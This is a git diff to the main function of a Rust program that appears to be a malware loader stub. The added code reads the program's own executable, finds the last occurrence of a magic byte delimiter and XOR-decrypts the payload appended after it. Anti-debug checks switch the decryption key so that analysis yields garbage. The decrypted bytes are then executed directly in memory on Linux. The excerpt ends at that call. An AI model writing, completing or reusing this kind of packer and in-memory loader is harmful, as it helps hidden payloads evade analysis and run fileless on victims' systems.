@@ -14,31 +14,36 @@ mod security;
 
 const MAGIC_DELIMITER: &[u8] = &[0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xFF, 0xEE, 0x11];
 const PARTIAL_KEY: u8 = 0x55;
-const MAX_CYCLES: u64 = 50_000_000;
+
 
 fn main() {
-    // 1. Anti-Debug
-    
+    // 1️⃣ Anti-Debug
     let corrupted_mode = security::run_all_checks();
 
-    if let Some(pos) = delimiter_pos 
-    {
+    let current_exe = env::current_exe().unwrap_or_else(|_| std::process::exit(0));
+
+    let mut file = File::open(current_exe).unwrap_or_else(|_| std::process::exit(0));
+
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer).unwrap_or_else(|_| std::process::exit(0));
+
+    let delimiter_pos =
+        buffer.windows(MAGIC_DELIMITER.len())
+              .rposition(|w| w == MAGIC_DELIMITER);
+
+    if let Some(pos) = delimiter_pos {
+
         let encrypted_data = &buffer[pos + MAGIC_DELIMITER.len()..];
 
-        let final_key = if corrupted_mode 
-        {
+        let final_key = if corrupted_mode {
             PARTIAL_KEY ^ 0xFF
-        } 
-        else 
-        {
+        } else {
             PARTIAL_KEY
         };
-    }
 
-        // 3. Déchiffrement en mémoire
-        let decrypted: Vec<u8> = encrypted_data.iter().map(|&b| b ^ final_key).collect();
+        let decrypted: Vec<u8> =
+            encrypted_data.iter().map(|&b| b ^ final_key).collect();
 
-        // 4. Exécution selon l'OS
         #[cfg(target_os = "linux")]
         linux_mem_exec(decrypted);
 
